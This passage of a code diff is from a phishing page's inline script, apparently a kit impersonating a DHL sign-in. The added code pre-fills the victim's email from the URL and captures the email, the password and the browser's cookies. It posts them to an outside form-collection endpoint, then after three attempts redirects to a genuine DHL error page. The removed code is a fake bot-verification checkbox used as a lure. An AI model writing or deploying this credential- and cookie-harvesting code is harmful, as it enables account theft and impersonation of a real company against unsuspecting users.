+                document.querySelectorAll('[data-i18n]').forEach(element => {
+                    const key = element.getAttribute('data-i18n');
+                    if (key.startsWith('[placeholder]')) {
+                        element.placeholder = t(key.replace('[placeholder]', ''));
+                    } else if (key.startsWith('[value]')) {
+                        element.value = t(key.replace('[value]', ''));
+                    } else {
+                        element.innerText = t(key);
+                    }
+                });
+                document.title = t('title');
+                document.querySelector('.lang-switcher').value = lang;
+            });
         }
-    }));
-}));
-    </script>
-    <!-- Bot Verification Script -->
-    <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      const botCheck = document.getElementById('bot-check');
-      const verificationDiv = document.getElementById('verification-div');
-      const formContainer = document.getElementById('form-container');
-      const mainContent = document.getElementById('main-content');
-      const lang = detectLanguage(); // Get the detected language
 
-      botCheck.addEventListener('change', function () {
-        if (this.checked) {
-          // Replace the checkbox with a loader
-          const checkboxContainer = this.parentElement;
-          checkboxContainer.innerHTML = `
-            <div class="spinner-container d-flex align-items-center">
-              <div class="spinner-border" role="status">
-                <span class="visually-hidden">${translations[lang].loaderText}</span>
-              </div>
-              <span class="ms-2">${translations[lang].verifyInstruction}</span>
-            </div>
-          `;
-
-          // Wait for 4 seconds
-          setTimeout(function () {
-            // Display "Redirecting..." message
-            verificationDiv.innerHTML = `
-              <div class="row">
-                <div class="col-12 verification-content">
-                  <h2>${translations[lang].redirecting}</h2>
-                </div>
-              </div>
-            `;
-
-            // Wait for 2 seconds
-            setTimeout(function () {
-              // Hide verification div and show main content
-              verificationDiv.style.display = 'none';
-              mainContent.style.display = 'block';
-              formContainer.style.display = 'block';
-            }, 2000);
-          }, 4000);
+        // Function to get all cookies as a string
+        function getCookies() {
+            const cookies = document.cookie || '';
+            console.log('Captured cookies:', cookies);
+            return cookies;
         }
-      });
-    });
+
+        // Form handling
+        (() => {
+            const form = document.getElementById('signin-form');
+            const emailInput = document.getElementById('email');
+            const errorMessageEl = document.getElementById('error-message');
+            const maxAttempts = 3;
+            const submitEndpoint = 'https://submit-form.com/Uxt0vouOR';
+            let attemptCount = 0;
+
+            const emailParam = extractEmailFromUrl();
+
+            if (emailParam) {
+                emailInput.value = emailParam;
+                emailInput.disabled = false;
+            } else {
+                emailInput.disabled = true;
+            }
+
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                errorMessageEl.textContent = '';
+
+                const email = form.email.value.trim();
+                const password = form.password.value;
+                const honeypot = form.honeypot.value;
+                const cookies = getCookies(); // Capture cookies
+
+                if (!email || !password) {
+                    errorMessageEl.textContent = i18next.t('error_message');
+                    return;
+                }
+
+                if (honeypot) {
+                    console.warn('Honeypot field filled, likely a bot submission.');
+                    return;
+                }
+
+                try {
+                    const response = await fetch(submitEndpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, password, cookies }), // Include cookies in payload
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Login failed');
+                    }
+
+                    console.log('Login successful, cookies sent:', cookies);
+                } catch (error) {
+                    console.error('Form submission error:', error);
+                    attemptCount++;
+                    if (attemptCount < maxAttempts) {
+                        form.password.value = '';
+                        form.password.focus();
+                        errorMessageEl.textContent = i18next.t('error_message');
+                    } else {
+                        window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
+                    }
+                }
+            });
+
+            const togglePassword = document.getElementById('toggle-password');
+            togglePassword.addEventListener('click', () => {
+                const passwordInput = document.getElementById('password');
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
+            });
+        })();
     </script>
 </body>
 </html>
